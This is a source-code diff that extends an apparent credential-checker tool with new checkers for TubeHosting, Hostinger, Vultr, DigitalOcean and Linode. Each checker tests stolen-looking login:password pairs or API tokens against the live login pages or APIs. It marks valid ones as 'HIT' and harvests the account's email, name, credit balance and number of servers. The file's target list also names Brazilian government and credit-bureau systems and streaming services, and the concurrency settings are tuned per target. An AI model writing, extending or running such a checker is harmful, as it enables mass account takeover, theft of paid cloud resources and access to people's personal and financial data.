@@ -67,7 +67,7 @@ function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
 
 // ── Types ─────────────────────────────────────────────────────────────────────
 export type CheckStatus = "HIT" | "FAIL" | "ERROR";
-export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita";
+export type CheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode";
 
 export interface CheckResult {
   credential: string;
@@ -2528,6 +2528,269 @@ async function checkReceita(login: string, password: string): Promise<CheckResul
   }
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  TUBEHOSTING CHECKER — WHMCS form auth (tubehosting.com.br)
+//  Retorna: saldo de crédito, quantidade de serviços/VPS ativos
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkTubeHosting(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  const cookieFile = `/tmp/tube_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
+  try {
+    // Step 1: GET login page — collect CSRF token + session cookie
+    const getResult = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "https://tubehosting.com.br/index.php?rp=/login",
+    ], 20_000);
+
+    const csrfMatch = getResult.body.match(/name="token"\s+value="([^"]+)"/i)
+      ?? getResult.body.match(/<input[^>]+name="_token"[^>]+value="([^"]+)"/i);
+    const csrf = csrfMatch ? csrfMatch[1] : "";
+
+    // Step 2: POST credentials
+    const postResult = await runCurl([
+      "--compressed", "-L", "--max-redirs", "5",
+      "-c", cookieFile, "-b", cookieFile,
+      "-A", DESKTOP_UA,
+      "-X", "POST",
+      "--data-urlencode", `username=${login}`,
+      "--data-urlencode", `password=${password}`,
+      ...(csrf ? ["--data-urlencode", `token=${csrf}`] : []),
+      "-H", "Content-Type: application/x-www-form-urlencoded",
+      "-H", "Referer: https://tubehosting.com.br/index.php?rp=/login",
+      "https://tubehosting.com.br/index.php?rp=/login",
+    ], 20_000);
+
+    const body = postResult.body;
+    const bLow = body.toLowerCase();
+
+    const isLoggedIn =
+      bLow.includes("clientarea") ||
+      bLow.includes("meu painel") ||
+      bLow.includes("área do cliente") ||
+      bLow.includes("saldo") ||
+      bLow.includes("crédito") ||
+      (bLow.includes("bem-vindo") && !bLow.includes("login")) ||
+      postResult.statusCode === 302;
+
+    if (isLoggedIn) {
+      const parts: string[] = ["tubehosting_ok"];
+      const balMatch = body.match(/R\$\s*([\d.,]+)/);
+      if (balMatch) parts.push(`saldo:R$${balMatch[1]}`);
+      const svcMatch = body.match(/(\d+)\s*(servi[çc]|vps|servidor|produto)/i);
+      if (svcMatch) parts.push(`serviços:${svcMatch[1]}`);
+      return { credential, login, status: "HIT", detail: parts.join(" | ") };
+    }
+
+    if (bLow.includes("senha incorreta") || bLow.includes("invalid") || bLow.includes("incorretos") || bLow.includes("não encontrado")) {
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+    }
+    if (postResult.statusCode === 0 || postResult.statusCode >= 500) {
+      return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
+    }
+    return { credential, login, status: "FAIL", detail: "login_failed" };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  } finally {
+    try { unlinkSync(cookieFile); } catch { /**/ }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  HOSTINGER CHECKER — REST API login → hPanel
+//  Retorna: nome, email, saldo de crédito, plano ativo
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkHostinger(login: string, password: string): Promise<CheckResult> {
+  const credential = `${login}:${password}`;
+  try {
+    const result = await runCurl([
+      "--compressed", "-L", "--max-redirs", "3",
+      "-X", "POST",
+      "-H", "Content-Type: application/json",
+      "-H", "Accept: application/json",
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      "--data-raw", JSON.stringify({ email: login, password }),
+      "https://www.hostinger.com/api/v1/auth/login-v2",
+    ], 20_000);
+
+    if (result.statusCode === 200) {
+      let detail = "hostinger_ok";
+      try {
+        const j = JSON.parse(result.body) as Record<string, unknown>;
+        const parts: string[] = [];
+        const data = (j.data ?? j) as Record<string, unknown>;
+        if (data.name)  parts.push(`nome:${data.name}`);
+        if (data.email) parts.push(`email:${data.email}`);
+        const ba = data.billing_account as Record<string, unknown> | undefined;
+        if (ba?.credit_balance !== undefined) parts.push(`crédito:${ba.credit_balance}`);
+        if (ba?.currency)                     parts.push(`moeda:${ba.currency}`);
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
+    if (result.statusCode === 401 || result.statusCode === 422) {
+      return { credential, login, status: "FAIL", detail: "credenciais_invalidas" };
+    }
+    if (result.statusCode === 429) {
+      return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  VULTR CHECKER — API key (password = API key)
+//  Retorna: email, saldo, pending_charges, nº de instâncias ativas
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkVultr(login: string, password: string): Promise<CheckResult> {
+  const apiKey   = password.trim() || login.trim();
+  const credential = `${login}:${password}`;
+  try {
+    const result = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiKey}`,
+      "-H", "Accept: application/json",
+      "https://api.vultr.com/v2/account",
+    ], 15_000);
+
+    if (result.statusCode === 200) {
+      let detail = "vultr_ok";
+      try {
+        const j    = JSON.parse(result.body) as Record<string, unknown>;
+        const acct = (j.account ?? j) as Record<string, unknown>;
+        const parts: string[] = [];
+        if (acct.email)                      parts.push(`email:${acct.email}`);
+        if (acct.name)                       parts.push(`nome:${acct.name}`);
+        if (acct.balance !== undefined)      parts.push(`saldo:$${acct.balance}`);
+        if (acct.pending_charges !== undefined) parts.push(`pendente:$${acct.pending_charges}`);
+
+        // Count active instances
+        const instRes = await runCurl([
+          "-H", `Authorization: Bearer ${apiKey}`,
+          "-H", "Accept: application/json",
+          "https://api.vultr.com/v2/instances?per_page=500",
+        ], 12_000);
+        if (instRes.statusCode === 200) {
+          const ij   = JSON.parse(instRes.body) as Record<string, unknown>;
+          const meta = ij.meta as Record<string, unknown> | undefined;
+          const n    = (meta?.total as number) ?? (ij.instances as unknown[])?.length ?? 0;
+          parts.push(`vps:${n}`);
+        }
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
+    if (result.statusCode === 401 || result.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: "api_key_invalida" };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  DIGITALOCEAN CHECKER — API token (password = token)
+//  Retorna: email, status, droplet_limit, nº de droplets ativos
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkDigitalOcean(login: string, password: string): Promise<CheckResult> {
+  const apiToken   = password.trim() || login.trim();
+  const credential = `${login}:${password}`;
+  try {
+    const result = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.digitalocean.com/v2/account",
+    ], 15_000);
+
+    if (result.statusCode === 200) {
+      let detail = "digitalocean_ok";
+      try {
+        const j    = JSON.parse(result.body) as Record<string, unknown>;
+        const acct = (j.account ?? j) as Record<string, unknown>;
+        const parts: string[] = [];
+        if (acct.email)         parts.push(`email:${acct.email}`);
+        if (acct.status)        parts.push(`status:${acct.status}`);
+        if (acct.droplet_limit) parts.push(`limite:${acct.droplet_limit}`);
+
+        // Count active droplets
+        const drRes = await runCurl([
+          "-H", `Authorization: Bearer ${apiToken}`,
+          "-H", "Accept: application/json",
+          "https://api.digitalocean.com/v2/droplets?per_page=200",
+        ], 12_000);
+        if (drRes.statusCode === 200) {
+          const dj   = JSON.parse(drRes.body) as Record<string, unknown>;
+          const meta = dj.meta as Record<string, unknown> | undefined;
+          const n    = (meta?.total as number) ?? (dj.droplets as unknown[])?.length ?? 0;
+          parts.push(`droplets:${n}`);
+        }
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
+    if (result.statusCode === 401) {
+      return { credential, login, status: "FAIL", detail: "token_invalido" };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  LINODE (AKAMAI CLOUD) CHECKER — API token (password = token)
+//  Retorna: email, nome, saldo, data de cadastro, nº de instâncias
+// ═══════════════════════════════════════════════════════════════════════════════
+async function checkLinode(login: string, password: string): Promise<CheckResult> {
+  const apiToken   = password.trim() || login.trim();
+  const credential = `${login}:${password}`;
+  try {
+    const result = await runCurl([
+      "--compressed", "-L",
+      "-H", `Authorization: Bearer ${apiToken}`,
+      "-H", "Accept: application/json",
+      "https://api.linode.com/v4/account",
+    ], 15_000);
+
+    if (result.statusCode === 200) {
+      let detail = "linode_ok";
+      try {
+        const j     = JSON.parse(result.body) as Record<string, unknown>;
+        const parts: string[] = [];
+        if (j.email)          parts.push(`email:${j.email}`);
+        if (j.first_name)     parts.push(`nome:${j.first_name} ${j.last_name ?? ""}`.trim());
+        if (j.balance !== undefined) parts.push(`saldo:$${j.balance}`);
+        if (j.active_since)   parts.push(`desde:${String(j.active_since).split("T")[0]}`);
+
+        // Count linodes
+        const lnRes = await runCurl([
+          "-H", `Authorization: Bearer ${apiToken}`,
+          "-H", "Accept: application/json",
+          "https://api.linode.com/v4/linode/instances?page_size=500",
+        ], 12_000);
+        if (lnRes.statusCode === 200) {
+          const lj = JSON.parse(lnRes.body) as Record<string, unknown>;
+          const n  = (lj.results as number) ?? (lj.data as unknown[])?.length ?? 0;
+          parts.push(`linodes:${n}`);
+        }
+        if (parts.length) detail = parts.join(" | ");
+      } catch { /**/ }
+      return { credential, login, status: "HIT", detail };
+    }
+    if (result.statusCode === 401 || result.statusCode === 403) {
+      return { credential, login, status: "FAIL", detail: "token_invalido" };
+    }
+    return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
+  } catch (e) {
+    return { credential, login, status: "ERROR", detail: `EXCEPTION:${String(e).slice(0, 80)}` };
+  }
+}
+
 // ── Runner ────────────────────────────────────────────────────────────────────
 const CONCURRENCY: Record<CheckerTarget, number> = {
   datasus:       2,
@@ -2552,6 +2815,12 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   sigma:         3,   // Form POST — moderate
   spotify:       2,   // OAuth2 flow via residential proxy — conservative
   receita:       3,   // Public CPF lookup — no auth, just validate
+  // VPS / Hosting
+  tubehosting:   2,   // WHMCS 2-step form — conservative
+  hostinger:     3,   // REST API — fast
+  vultr:         5,   // API key check — very fast
+  digitalocean:  5,   // API token check — very fast
+  linode:        5,   // API token check — very fast
 };
 
 function resolveChecker(target: CheckerTarget) {
@@ -2577,6 +2846,12 @@ function resolveChecker(target: CheckerTarget) {
     case "sigma":         return checkSigma;
     case "spotify":       return checkSpotify;
     case "receita":       return checkReceita;
+    // VPS / Hosting
+    case "tubehosting":   return checkTubeHosting;
+    case "hostinger":     return checkHostinger;
+    case "vultr":         return checkVultr;
+    case "digitalocean":  return checkDigitalOcean;
+    case "linode":        return checkLinode;
     default:              return checkIseek;
   }
 }
@@ -2828,7 +3103,7 @@ async function runCheckerJobAsync(
   finish();
 }
 
-const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita"];
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita", "tubehosting", "hostinger", "vultr", "digitalocean", "linode"];
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
